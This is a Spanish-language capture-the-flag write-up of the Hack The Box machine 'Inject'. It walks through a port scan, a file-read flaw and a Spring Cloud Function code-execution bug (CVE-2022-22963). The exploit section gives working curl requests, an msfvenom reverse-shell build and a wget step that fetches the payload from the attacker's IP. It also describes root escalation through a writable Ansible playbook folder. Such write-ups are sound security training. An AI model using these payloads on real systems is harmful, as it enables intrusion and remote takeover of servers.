---
layout: single
title: Inject - Hack The Box - WriteUp
excerpt: "Resolución de la máquina de dificultad fácil 'Inject' de Hack the Box"
date: 2023-03-13
classes: wide
header:
  teaser: /assets/images/htb-writeup-inject/inject-logo.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
  - infosec
tags:  
  - spring
  - maven
  - LFI
  - RCE
  - msfvenom

---

![inject-logo](/assets/images/htb-writeup-inject/inject-logo.png)

## Portscan

```bash
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2023-03-14 16:53 CET
Initiating SYN Stealth Scan at 16:53
Scanning 10.10.11.204 [65535 ports]
Discovered open port 22/tcp on 10.10.11.204
Discovered open port 8080/tcp on 10.10.11.204
Completed SYN Stealth Scan at 16:53, 14.01s elapsed (65535 total ports)
Nmap scan report for 10.10.11.204
Host is up, received user-set (0.057s latency).
Scanned at 2023-03-14 16:53:27 CET for 14s
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE    REASON
22/tcp   open  ssh        syn-ack ttl 63
8080/tcp open  http-proxy syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 14.15 seconds
           Raw packets sent: 70006 (3.080MB) | Rcvd: 69922 (2.797MB)
```

## Website

La web nos presenta las opciones de "Log in" y "Sign up" pero ninguna funciona. También encontramos una funcionalidad de subida de ficheros que solo permite subir imágenes. El primer pensamiento al encontrarnos con esto es intentar bypassear el filtro y subir una shell reversa, pero la aplicación está montada de tal manera que nunca va a ejecutar un php, sino que siempre cargará los ficheros como imágenes.

Descatarndo el bypass del filtro, si usamos Burpsuite e interceptamops la petición que realizamos para abrir una imagen subida obersamos que podemos realizar un LFI.

![lfi-passwd](/assets/images/htb-writeup-inject/lfi-passwd.png)

Este LFI nos permite revisar los directorios y qué ficheros hay en cada uno, así que vamos a aprovecharnos de ésto para ver la estructura de la aplicación web.

Ésta app usa java y encontramos el fichero "UserController.java" que contiene toda la funcionalidad de la web, y aquí es donde vemos que efectivamente no se podía hacer bypass del filtro de imágenes.

![user-controller](/assets/images/htb-writeup-inject/user-controller.png)

La aplicación usa el framework de Spring y Maven para su gestión, así que revisando el archivo de configuración Maven "pom.xml" vemos que se están usando diferentes dependecnias y una de ellas es vulnerable en la versión que se está usando.

![spring-cloud-version](/assets/images/htb-writeup-inject/spring-cloud-version.png)

La vulnerabilidad catalogada como **CVE-2022-22963** permite realizar un RCE con la siguiente petición usando curl:

```bash
curl -X POST  http://10.10.11.204:8080/functionRouter -H 'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("<COMANDO>")' --data-raw 'data' -v
```

Aprovechando este RCE podemos crear una shell reversa con msfvenom:

```bash
msfvenom -p linux/x64/shell_reverse_tcp -LHOST=10.10.14.81 -LPORT=4444 -f elf -o shell.elf
```

Y subirla a la máquina victima con wget por ejemplo:

```bash
curl -X POST  http://10.10.11.204:8080/functionRouter -H 'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("wget -O /tmp/shell.elf http://10.10.14.81/shell.elf")' --data-raw 'data' -v
```

## User shell

Una vez tenemos la shell reversa en la máquina víctima, la ejecutamos con el comando

```bash
curl -X POST  http://10.10.11.204:8080/functionRouter -H 'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("./tmp/shell.elf")' --data-raw 'data' -v
```

Y obtenemos una shell interactiva.

![user-shell](/assets/images/htb-writeup-inject/user-shell.png)

Aún no podemos leer la flag de usuario puesto que "frank" no tiene permisos. Pero en el directorio home de frank encontramos un archivo dentro de un directorio oculto llamado ".m2" que contiene información sensible del usuario phil. Con esta información podemos cambiar de usuario y obtener la flag.

![user-flag](/assets/images/htb-writeup-inject/user-flag.png)

## Privilege escalation

![ansible-folder](/assets/images/htb-writeup-inject/ansible-folder.png)

Observamos que el usuario phil pertenece al grupo "staff" que tiene permisos de escritura en la carpeta **/opt/automation/tasks**, en el cual se guardan los "playbooks" ejecutados por **ansible**.

Ansible es vulnerable y permite la elevación de privilegios si tenemos permisos para crear un playbook que nos lo permita. Para esto debemos crear un playbook que ejecute un script con permisos de root:

![ansible-priv-esc](/assets/images/htb-writeup-inject/ansible-priv-esc.png)

Como vemos, este playbook ejecuta en comando "sudo bash /tmp/root.sh" en el servidor localhost y a su vez el script root.sh conecta con nuestra máquina atacante dándonos una shell reversa.

Ahora solo queda ejecutar el playbook usando el comando "ansible" y esperando un poco obtendremos la shell con permisos de root y su respectiva flag:

![root-flag](/assets/images/htb-writeup-inject/root-flag.png)
